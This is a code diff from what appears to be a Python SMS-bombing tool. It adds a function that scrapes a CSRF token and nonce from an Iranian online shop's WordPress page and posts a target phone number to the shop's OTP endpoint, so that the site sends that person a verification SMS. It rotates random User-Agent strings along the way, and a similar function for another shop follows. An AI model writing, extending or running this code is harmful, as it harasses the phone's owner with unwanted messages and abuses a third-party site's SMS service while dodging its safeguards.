@@ -20,7 +20,103 @@ def check_internet():
     except socket.gaierror:
         return False
 
-# تابع vitrin_shop
+
+
+# تابع Sms list
+
+
+def nillarayeshi(phone):
+    # لیست User-Agent های مختلف
+    user_agents = [
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0",
+        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
+    ]
+
+    formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+    try:
+        # مرحله 1: استخراج CSRF و nonce از صفحه اصلی
+        session = requests.Session()
+        home_url = "https://nillarayeshi.com/"
+        home_response = session.get(home_url, timeout=10, headers={
+            "User-Agent": random.choice(user_agents)  # User-Agent تصادفی
+        })
+        home_response.encoding = 'utf-8'
+
+        # استخراج csrf و dig_nounce
+        csrf_match = re.search(r'name="csrf" value="([a-f0-9]+)"', home_response.text)
+        nonce_match = re.search(r'name="dig_nounce" value="([a-f0-9]+)"', home_response.text)
+        csrf = csrf_match.group(1) if csrf_match else "b77d25383c"
+        nonce = nonce_match.group(1) if nonce_match else "b77d25383c"
+
+        # مرحله 2: ارسال درخواست
+        url = "https://nillarayeshi.com/wp-admin/admin-ajax.php"
+        payload = {
+            "action": "digits_check_mob",
+            "countrycode": "+98",
+            "mobileNo": formatted_phone,
+            "csrf": csrf,
+            "login": "2",
+            "username": "",
+            "email": "",
+            "captcha": "",
+            "captcha_ses": "",
+            "digits": "1",
+            "json": "1",
+            "whatsapp": "0",
+            "digits_reg_name": "نام",
+            "digregcode": "+98",
+            "digits_reg_mail": formatted_phone,
+            "digregscode2": "+98",
+            "mobmail2": "",
+            "digits_reg_password": "",
+            "dig_otp": "",
+            "code": "",
+            "dig_reg_mail": "",
+            "dig_nounce": nonce
+        }
+
+        headers = {
+            "User-Agent": random.choice(user_agents),  # User-Agent تصادفی
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "*/*",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://nillarayeshi.com",
+            "Referer": "https://nillarayeshi.com/",
+        }
+
+        response = session.post(url, data=payload, headers=headers, timeout=10)
+        response.encoding = 'utf-8'
+
+        print(f'{g}[+] Status: {response.status_code}{a}')
+        print(f'{g}[+] Response: {response.text}{a}')
+
+        if response.status_code == 200:
+            try:
+                data = response.json()
+                if data.get("success") or "sent" in str(data).lower():
+                    print(f'{g}(nillarayeshi) {a}Code Sent to {phone}')
+                    return True
+                else:
+                    print(f'{r}[-] (nillarayeshi) Failed: {data.get("message", "Unknown")}{a}')
+                    return False
+            except ValueError:
+                if "1" in response.text or "sent" in response.text.lower():
+                    print(f'{g}(nillarayeshi) {a}Code Sent to {phone}')
+                    return True
+                else:
+                    print(f'{r}[-] (nillarayeshi) Unknown Response: {response.text}{a}')
+                    return False
+        print(f'{r}[-] (nillarayeshi) HTTP Error: {response.status_code}{a}')
+        return False
+
+    except Exception as e:
+        print(f'{r}[!] nillarayeshi Exception: {e}{a}')
+        return False
+
+
 def vitrin_shop(phone):
     formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
     def get_fresh_token():
